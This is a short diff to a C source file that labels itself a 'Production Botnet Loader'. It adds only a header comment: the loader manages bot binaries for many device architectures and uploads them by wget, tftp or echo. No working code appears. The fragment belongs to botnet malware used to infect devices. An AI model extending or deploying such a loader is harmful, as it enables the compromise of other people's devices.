@@ -1,5 +1,10 @@
 /*
  * Production Botnet Loader - Binary Management
+ * ============================================================================
+ * Manages architecture-specific bot binaries
+ * Supported: arm, arm5, arm6, arm7, mips, mpsl, x86, x86_64, ppc, spc, m68k, sh4
+ * Upload Methods: wget (primary), tftp (fallback), echo (last resort)
+ * ============================================================================
  */
 
 #include "includes.h"
